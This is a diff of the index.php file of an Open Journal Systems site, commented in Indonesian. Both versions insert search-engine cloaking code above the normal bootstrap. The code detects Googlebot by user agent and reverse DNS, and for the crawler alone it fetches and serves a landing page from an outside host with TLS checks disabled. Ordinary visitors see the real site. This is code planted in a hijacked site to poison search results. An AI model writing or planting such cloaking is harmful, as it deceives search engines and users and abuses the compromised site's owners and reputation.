@@ -1,64 +1,59 @@
 <?php
-// Simpen di index.php bagian PALING ATAS
+// CLOAKING DENGAN DEBUG
+$is_google = false;
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-// Deteksi Google pake multiple parameter
-$is_bot = 0;
-$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+// Deteksi Google (case insensitive)
+if(preg_match('/Googlebot|Google-Inspection|Google-Site-Verification|Googlebot-Mobile/i', $ua)) {
+    $is_google = true;
+}
 
-// Google bot signatures (lowercase)
-$google_signs = ['googlebot', 'google-inspection', 'google-site-verification', 'googlebot-mobile'];
-foreach($google_signs as $sign) {
-    if(strpos($ua, $sign) !== false) {
-        $is_bot = 1;
-        break;
+// Cek IP pake reverse DNS
+if(!$is_google && isset($_SERVER['REMOTE_ADDR'])) {
+    $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+    if(preg_match('/google(bot)?\.com$/i', $host)) {
+        $is_google = true;
     }
 }
 
-// DNS check
-if(!$is_bot) {
-    $host = gethostbyaddr($ip);
-    if(strpos($host, 'google') !== false) {
-        $is_bot = 1;
-    }
-}
+// FORCE TEST - Hapus ini nanti
+// $is_google = true; // UNCOMMENT UNTUK TEST
 
-// Cek query param juga
-if(isset($_GET['gclid']) || isset($_GET['utm_source']) && strpos($_GET['utm_source'], 'google') !== false) {
-    $is_bot = 1;
-}
-
-if($is_bot) {
-    // Pake proxy biar ga ketauan
-    $proxy = 'https://cors-anywhere.herokuapp.com/'; // atau pake proxy lo sendiri
-    $target = 'https://pessawat.site/iyaisoo/index.html';
-    
-    // Pake curl dengan proxy
+if($is_google) {
+    // PAKE CURL (lebih reliable)
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $proxy . $target);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-    curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Accept: text/html,application/xhtml+xml',
-        'Accept-Language: en-US,en;q=0.9',
-        'Cache-Control: no-cache'
-    ]);
+    curl_setopt($ch, CURLOPT_URL, 'https://pessawat.site/iyaisoo/index.html');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
+    curl_setopt($ch, CURLOPT_HEADER, false);
     
-    $html = curl_exec($ch);
-    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
     curl_close($ch);
     
-    if($html && $httpcode == 200) {
-        echo $html;
+    // DEBUG - Hapus nanti
+    error_log("Cloaking Debug - HTTP: $http_code, Error: $error, Content Length: " . strlen($content));
+    
+    if($content !== false && $http_code == 200 && strlen($content) > 100) {
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $content;
+        exit;
+    } else {
+        // Fallback kalo landing ga bisa
+        echo "<html><head><title>Site</title></head><body>";
+        echo "<h1>Welcome</h1>";
+        echo "<p>This is a test page</p>";
+        echo "</body></html>";
         exit;
     }
 }
 
-// OJS bootstrap...
+// OJS CODE...
 require_once 'lib/pkp/lib/vendor/autoload.php';
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
